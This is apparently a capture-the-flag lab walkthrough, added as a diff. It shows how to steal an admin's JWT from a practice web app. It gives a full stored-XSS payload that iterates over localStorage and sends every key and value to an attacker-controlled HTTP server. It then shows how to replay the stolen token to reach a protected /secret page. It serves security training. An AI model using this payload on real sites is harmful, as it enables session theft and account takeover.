@@ -1,0 +1,24 @@
+We know that the Admin has a jwt and is currently viewing the coments that are
+posted.
+Where is the jwt?
+Unfortunately, a common place to store a jwt is in localStorage. We could run
+with this guess, but with some inspection we could find that our own jwt is
+stored in localStorage. Maybe Admin's is also in localStorage.
+
+0. Use dirbust on 10.10.10.1:3000. the /secret directory has a lot of goodies
+on it, but you will notice that the functionalities are disabled with out Admin
+token
+
+1. Use XSS to return contents of executer's local storage to a server of your
+choice (preferably one you have access to)
+    a. Launch an HTTP server on your own machine
+           python -m SimpleHTTPServer
+    b. Inject js into comment field that will iterate through localStorage and
+       send an informative request to your server
+           <script>var xhttp = new XMLHttpRequest(); for (var i = 0; i < localStorage.length; i++){xhttp.open('GET', 'http://10.10.10.2:8000/?' + localStorage.key(i) + '=' + localStorage.getItem(localStorage.key(    i)), true); xhttp.send();} </script>
+    c. You will see Admin's jwt in your server logs
+
+2. Add jwt to your localStorage
+    in webpage console: localStorage.setItem('jwt', '[inser jwt]')
+
+3. Navigate to 10.10.10.1/secret and obtain 1st flag
